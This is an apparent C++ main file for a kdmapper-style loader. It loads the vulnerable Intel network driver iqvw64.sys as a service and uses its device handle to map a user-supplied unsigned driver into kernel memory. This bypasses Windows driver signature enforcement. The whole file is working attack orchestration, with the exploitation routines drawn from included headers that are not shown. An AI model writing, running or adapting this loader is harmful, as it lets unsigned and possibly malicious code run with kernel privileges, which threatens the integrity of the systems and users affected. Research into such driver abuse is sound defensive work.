#include <iostream>
#include "drivers_data.h"
#include "parameter_handling.h"
#include "vulndriver.h"
#include "utils.h"
#include "unsigned_load.h"
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define INDEPENDENT_PAGES 0x1000
#define REGULAR_NONPAGED_POOL 0x2000
#define DESCRIPTOR_MODULE 0x8000

typedef struct _VULNDATA {
	HANDLE DriverHandle;
	const WCHAR* StraightDriverName;
	const char* DriverSymbolicLink;
	const char* DriverServiceName;
	PVOID DriverDataPointer;
	ULONG DriverTimestamp;
} VULNDATA, PVULNDATA;


int main(int argc, char* argv[]){
	VULNDATA IntelDriver = { 0 };
	NTSTATUS Status = 0;
	PVOID KernelBaseAddress = NULL;
	PVOID UnsignedData = NULL;
	ULONG UnsignedSize = 0;
	ULONG PoolType = 0;
	char IntelDriverFullPath[MAX_PATH] = { 0 };


	// Validate parameters:
	if (!ValidateParameters(argc, argv, &PoolType)) {
		return 0;
	}
	printf("[+] Provided command line parameters are valid!\n");


	// Set values for intel driver:
	IntelDriver.DriverServiceName = "VulnService";
	IntelDriver.StraightDriverName = L"VulnDriver.sys";
	IntelDriver.DriverSymbolicLink = "\\\\.\\Nal";
	IntelDriver.DriverDataPointer = (BYTE*)KdmDriverData;
	IntelDriver.DriverTimestamp = 0x5284EAC3;
	general::GetCurrentPathRegular(IntelDriverFullPath, IntelDriver.StraightDriverName);


	// Load vulnurable driver into memory:
	Status = VulnurableDriver::LoadVulnurableDriver(&IntelDriver.DriverHandle, IntelDriver.StraightDriverName, IntelDriver.DriverSymbolicLink,
		IntelDriver.DriverServiceName, (const BYTE*)IntelDriver.DriverDataPointer, IntelDriver.DriverTimestamp, &KernelBaseAddress);
	if (Status != STATUS_SUCCESS || IntelDriver.DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] Loading vulnurable driver procedure of kdmapper vulnurable driver (iqvw64.sys) failed with status 0x%x\n", Status);
		return 0;
	}


	// Read unsigned driver into a memory buffer:
	UnsignedData = specific::FileToMemory(argv[1], &UnsignedSize);
	if (UnsignedData == NULL || UnsignedSize == 0) {
		printf("[-] Failed to get unsigned driver data (handle = NULL/returned pool size == 0): %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(&IntelDriver.DriverHandle, IntelDriverFullPath, IntelDriver.DriverServiceName);
		if (UnsignedData != NULL) {
			free(UnsignedData);
		}
		return 0;
	}


	// Load unsigned driver into memory, call DriverEntry() and clean operation (resolve imports, relocations..);
	if (UnsignedDriver::LoadDriver(&IntelDriver.DriverHandle, KernelBaseAddress, IntelDriver.DriverDataPointer, PoolType, &Status) == NULL) {
		printf("[-] Failed to load unsigned driver and start operation of driver: %d\n", GetLastError());
		VulnurableService::UnloadVulnurableDriver(&IntelDriver.DriverHandle, IntelDriverFullPath, IntelDriver.DriverServiceName);
		if (UnsignedData != NULL) {
			free(UnsignedData);
		}
		return 0;
	}
	printf("[+] Loaded unsigned driver %s successfully, returned status = 0x%x\n", argv[1], Status);


	// Final unloading of vulnurable driver:
	if (!NT_SUCCESS(VulnurableService::UnloadVulnurableDriver(&IntelDriver.DriverHandle, IntelDriverFullPath, IntelDriver.DriverServiceName))) {
		printf("[-] Failed to perform final unloading of vulnurable driver: %d\n", GetLastError());
		if (UnsignedData != NULL) {
			free(UnsignedData);
		}
		return 0;
	}
	if (UnsignedData != NULL) {
		free(UnsignedData);
	}
	return 1;
}